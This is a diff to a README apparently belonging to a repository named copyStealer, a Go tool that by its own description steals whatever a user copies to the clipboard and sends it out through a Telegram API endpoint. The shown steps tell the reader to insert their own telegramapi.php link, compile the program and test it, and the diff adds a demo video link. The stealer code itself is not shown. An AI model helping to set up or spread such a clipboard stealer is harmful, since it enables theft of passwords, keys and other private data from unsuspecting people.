@@ -8,5 +8,8 @@ This repository will guide you to steal whatever the user copies and send conten
 <p>3. Change line number 36 of you copyStealer.go file according to you. Paste the correct link of your telegramapi.php in line number 36. </p>
 
 <p>4. Compile with <i><b>go build .\copyStealer.go</b></i></p>
-<p>5. Test it./p>
-  
+<p>5. Test it.</p>
+  <h3>Demo</h3>
+
+https://user-images.githubusercontent.com/83189731/158163224-72b0c891-fda8-4d05-a179-b61ecda38240.mp4
+
